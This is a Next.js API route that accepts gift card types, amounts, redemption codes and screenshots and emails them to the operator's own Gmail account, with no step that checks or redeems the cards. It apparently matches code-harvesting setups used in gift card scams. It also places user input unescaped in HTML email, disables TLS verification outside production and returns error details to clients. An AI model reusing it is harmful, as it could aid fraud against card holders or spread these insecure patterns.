import { NextRequest, NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

export async function POST(request: NextRequest) {
  try {
    const formData = await request.formData();

    const getField = (name: string): string => {
      const value = formData.get(name);
      return value instanceof File ? '' : value?.toString().trim() || '';
    };

    const cardType = getField('cardType');
    const amount = getField('amount');
    const cardCode = getField('cardCode');
    const email = getField('email') || 'Not provided';
    const file = formData.get('screenshot') as File | null;

    // Validate required fields
    if (!cardType || !amount || !cardCode) {
      return NextResponse.json(
        { success: false, message: 'Card type, amount, and code are required' },
        { status: 400 }
      );
    }

    // Validate card code format (basic check)
  // Validate card code format (basic check)
// Validate card code presence
if (!cardCode.trim()) {
  return NextResponse.json(
    { success: false, message: 'Card code is required' },
    { status: 400 }
  );
}



    let attachment = null;
    if (file && file.size > 0) {
      // Validate file size
      if (file.size > 5 * 1024 * 1024) {
        return NextResponse.json(
          { success: false, message: 'File too large (max 5MB)' },
          { status: 400 }
        );
      }

      // Validate file type
      const allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'application/pdf'];
      if (!allowedTypes.includes(file.type)) {
        return NextResponse.json(
          { success: false, message: 'Invalid file type. Only images and PDFs are allowed' },
          { status: 400 }
        );
      }

      attachment = {
        filename: file.name,
        content: Buffer.from(await file.arrayBuffer()),
        contentType: file.type,
      };
    }

    const mailUser = process.env.MAIL_USER;
    const mailPass = process.env.MAIL_PASS;

    if (!mailUser || !mailPass) {
      console.error('Email credentials not configured');
      return NextResponse.json(
        { success: false, message: 'Server configuration error' },
        { status: 500 }
      );
    }

    // Configure transporter with more options
    const transporter = nodemailer.createTransport({
      host: 'smtp.gmail.com',
      port: 587,
      secure: false, // true for 465, false for other ports
      auth: {
        user: mailUser,
        pass: mailPass,
      },
      tls: {
        rejectUnauthorized: process.env.NODE_ENV === 'production' // Only reject in production
      }
    });

    // Verify connection configuration
    await transporter.verify().catch(error => {
      console.error('SMTP connection error:', error);
      throw new Error('Failed to establish email connection');
    });

    const mailOptions = {
      from: `"Gift Card Service" <${mailUser}>`,
      to: mailUser,
      subject: `New Gift Card: ${cardType} ($${amount})`,
      text: `Card Details:\nType: ${cardType}\nAmount: $${amount}\nCode: ${cardCode}\nFrom: ${email}`,
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
          <h2 style="color: #2563eb;">New Gift Card Received</h2>
          <div style="background-color: #f9fafb; padding: 16px; border-radius: 8px;">
            <p><strong style="color: #4b5563;">Type:</strong> ${cardType}</p>
            <p><strong style="color: #4b5563;">Amount:</strong> $${amount}</p>
            <p><strong style="color: #4b5563;">Code:</strong> <code style="background-color: #e5e7eb; padding: 2px 4px; border-radius: 4px;">${cardCode}</code></p>
            <p><strong style="color: #4b5563;">From:</strong> ${email}</p>
          </div>
          ${attachment ? `<p style="margin-top: 16px;">Attachment included: ${attachment.filename}</p>` : ''}
        </div>
      `,
      attachments: attachment ? [attachment] : [],
    };

    await transporter.sendMail(mailOptions);

    return NextResponse.json({ 
      success: true, 
      message: 'Gift card submitted successfully' 
    });

  } catch (error) {
    console.error('Server error details:', error);
    return NextResponse.json(
      {
        success: false,
        message: 'Internal server error',
        error: error instanceof Error ? error.message : 'Unknown error',
        ...(process.env.NODE_ENV === 'development' && {
          stack: error instanceof Error ? error.stack : undefined
        })
      },
      { status: 500 }
    );
  }
}